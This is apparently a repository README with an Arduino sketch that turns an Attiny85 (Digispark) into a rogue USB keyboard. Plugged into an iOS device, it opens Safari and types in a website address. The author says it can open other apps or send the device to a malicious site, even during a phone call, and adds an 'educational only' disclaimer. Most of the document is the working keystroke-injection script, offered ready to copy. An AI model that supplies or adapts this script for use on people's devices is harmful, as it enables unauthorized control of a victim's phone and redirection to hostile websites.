# Attiny85ScriptiOSOpenApp
This repo open Safari in a iOS Device and visit a web site using a Attiny85.

The script could be use to open other apps or connect the device to malicious web site.

Firsts command is to press "Home botton", so you can use the script though device is in a call ;) .

                                            !!!! DISCLAIMER !!!!
This script is only for educational and I m not responsable if you use it for malicious things.


In Arduino IDE copy (or modify) script:

!

#include "DigiKeyboard.h"
void setup() {
 
}

void loop() {


  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_H, MOD_GUI_LEFT); //Home 
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT); // Search
  DigiKeyboard.delay(800);
  DigiKeyboard.print("safari"); //Safari ;)
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboard.delay(800);
  DigiKeyboard.sendKeyStroke(KEY_L, MOD_GUI_LEFT); //Search URL in Safari
  DigiKeyboard.delay(800);
  
  DigiKeyboard.print("chehackme.com"); //my WebSite just for example
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);


  DigiKeyboard.delay(100000);


 
}


!
